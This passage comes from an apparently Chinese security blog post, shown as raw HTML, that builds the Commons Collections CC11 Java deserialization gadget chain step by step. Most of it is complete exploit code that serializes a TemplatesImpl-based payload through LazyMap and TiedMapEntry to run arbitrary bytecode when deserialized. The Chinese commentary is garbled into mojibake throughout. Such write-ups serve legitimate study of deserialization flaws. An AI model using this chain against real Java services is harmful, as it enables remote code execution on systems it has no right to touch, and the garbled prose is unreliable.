lazyMapClass.getDeclaredMethod(<span class="string">&quot;get&quot;</span>, Object.class);  </span><br><span class="line">        lazyGetMethod.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        lazyGetMethod.invoke(lazyMap, chainedTransformer);  </span><br><span class="line">        &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åå°±æ˜¯å’Œ<code>TiedMapEntry</code> ç±»è¿èµ·æ¥ï¼Œå› ä¸º<code>TiedMapEntry</code> ç±»ä¸­çš„ <code>getValue()</code> æ–¹æ³•è°ƒç”¨äº† <code>LazyMap</code> çš„ <code>get()</code> æ–¹æ³•ï¼Œé‚£ä¹ˆexpå°±æ˜¯ä¸‹é¢è¿™æ ·</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC11Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">tclass</span> <span class="operator">=</span> templates.getClass();  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);  </span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);  </span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://java-tools/test.class&quot;</span>));  </span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;  </span><br><span class="line">        bytecodes.set(templates,codes);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);  </span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">        templates.newTransformer();  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap,chainedTransformer);  </span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;key&quot;</span>);  </span><br><span class="line">        tiedMapEntry.getValue();  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åç»§ç»­å¾€å‰å³<code>hashCode()</code> æ–¹æ³•è°ƒç”¨äº† <code>getValue()</code> æ–¹æ³•è€Œ<code>hashCode()</code>æ–¹æ³•è°ƒç”¨åœ¨å‰é¢å·²ç»åˆ—è¿‡äº†æ‰€ä»¥ç›´æ¥æ„é€ </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC11Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">tclass</span> <span class="operator">=</span> templates.getClass();  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);  </span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        nameField.set(templates, <span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);  </span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://java-tools/test.class&quot;</span>));  </span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;  </span><br><span class="line">        bytecodes.set(templates, codes);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);  </span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        tfactory.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">        templates.newTransformer();  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);  </span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;key&quot;</span>);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        map.put(tiedMapEntry, <span class="string">&quot;value&quot;</span>);  </span><br><span class="line">        serialize(map);  </span><br><span class="line"><span class="comment">//        unserialize(&quot;ser.bin&quot;);  </span></span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨è°ƒç”¨è¿™æ®µä»£ç çš„æ—¶å€™æˆ‘ä»¬å‘ç°ä¼šç›´æ¥åºåˆ—åŒ–çš„æ—¶å€™ä¼šç›´æ¥å¼¹å‡ºè®¡ç®—å™¨ï¼Œè¿™é‡Œå…¶å®å’Œurldnsé“¾ç±»ä¼¼ï¼Œè¿™é‡Œåœ¨è°ƒè¯•çš„åˆé‡åˆ°äº†å’Œæˆ‘ä¸Šæ¬¡è°ƒè¯•CC7çš„æ—¶å€™ä¸€æ ·çš„é—®é¢˜å¦‚ä¸‹<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151108523.png" alt="image-20230715110839336"><br>æœ€ç»ˆæ²¡èƒ½è§£å†³ï¼Œä¸Šæ¬¡æ˜¯å› ä¸ºè¿‡äº†ä¸€å¤©å†å¼„è‡ªå·±å°±å¥½äº†ï¼Œç°åœ¨åˆæ˜¯è¿™æ ·ï¼Œå“ï¼Œéš¾æ<br>è¿™é‡Œå…¶å®å°±æ˜¯CC6ä¸­çš„é—®é¢˜ï¼Œå‡ºåœ¨<code>Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);</code>è¿™æ¡è¯­å¥ä¸Šï¼Œè¿™é‡Œputæ–¹æ³•ä¹Ÿä¼šè°ƒç”¨åˆ°hashæ–¹æ³•ï¼Œä½†æ˜¯æˆ‘ä»¬éœ€è¦çš„æ˜¯putValé‡Œé¢çš„hashæ–¹æ³•å¯¹keyè¿›è¡Œè®¡ç®—æ‰€ä»¥å°±éœ€è¦é€šè¿‡åå°„å¯¹putæ”¹å€¼ï¼Œè®©ä»–ä¸è§¦å‘è¿™æ¡é“¾ç„¶åå†putå®Œä¹‹åå†åå°„æ”¹å›æ¥ï¼Œæœ€ç»ˆçš„ä»£ç å¯ä»¥è°ƒè¯•ï¼Œä½†æ˜¯æ²¡æ˜ç™½ä¸Šé¢çš„ä¸ºä»€ä¹ˆä¸å¯ä»¥ï¼Ÿç„¶åè¿™é‡Œè¿˜æœ‰ä¸ªé—®é¢˜å°±æ˜¯putçš„æ—¶å€™ä¼šä¼ å…¥ä¸€ä¸ªkeyååºåˆ—åŒ–æ— æ³•è¿›å…¥ifæ‰§è¡Œtransformæ–¹æ³•ï¼Œæ‰€ä»¥éœ€è¦åˆ æ‰è¿™ä¸ªkey<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151108022.png" alt="image-20230715110851891"><br>æœ€ç»ˆçš„ä»£ç å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC11Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">tclass</span> <span class="operator">=</span> templates.getClass();  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);  </span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        nameField.set(templates, <span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);  </span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://java-tools/test.class&quot;</span>));  </span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;  </span><br><span class="line">        bytecodes.set(templates, codes);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);  </span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        tfactory.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line"><span class="comment">//        Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);  </span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap,<span class="keyword">new</span>  <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));  </span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;key&quot;</span>);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        map.put(tiedMapEntry, <span class="string">&quot;value&quot;</span>);  </span><br><span class="line">        lazyMap.remove(<span class="string">&quot;key&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> LazyMap.class;  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);  </span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        factoryField.set(lazyMap,chainedTransformer);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        serialize(map);  </span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ä¸å¸¦-Transformer-æ•°ç»„çš„-CC11-é“¾å­"><a href="#ä¸å¸¦-Transformer-æ•°ç»„çš„-CC11-é“¾å­" class="headerlink" title="ä¸å¸¦ Transformer æ•°ç»„çš„ CC11 é“¾å­"></a>ä¸å¸¦ Transformer æ•°ç»„çš„ CC11 é“¾å­</h3><p>ä¸Šé¢æ˜¯å¸¦äº†Transformeræ•°ç»„çš„é‚£ä¹ˆç°åœ¨è¦å»æ‰ï¼ŒLazyMap#get çš„å‚æ•° keyï¼Œä¼šè¢«ä¼ è¿›transform()ï¼Œå®é™…ä¸Šå®ƒå¯ä»¥æ‰®æ¼” ConstantTransformer çš„è§’è‰²â€”â€” ä¸€ä¸ªç®€å•çš„å¯¹è±¡ä¼ é€’è€…ã€‚<br>æˆ‘ä»¬ LazyMap.get(key) ç›´æ¥è°ƒç”¨ InvokerTransfomer.transform(key)ï¼Œç„¶ååƒCC2é‚£æ ·è°ƒç”¨ TempalteImpl.newTransformer() æ¥å®Œæˆåç»­è°ƒç”¨ã€‚å³åšå¦‚ä¸‹ä¿®æ”¹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//æ›¿æ¢ä¸ºå¦‚ä¸‹ä»£ç </span></span><br><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br></pre></td></tr></table></figure><p>å†å°†åé¢å‡ è¡Œçš„ä»£ç ä¿®æ”¹å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, templates);</span><br><span class="line"> </span><br><span class="line"><span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">expMap.put(tiedMapEntry, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">lazyMap.remove(templates);</span><br></pre></td></tr></table></figure><p>å¾—åˆ°çš„æœ€ç»ˆ EXP å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line"><span 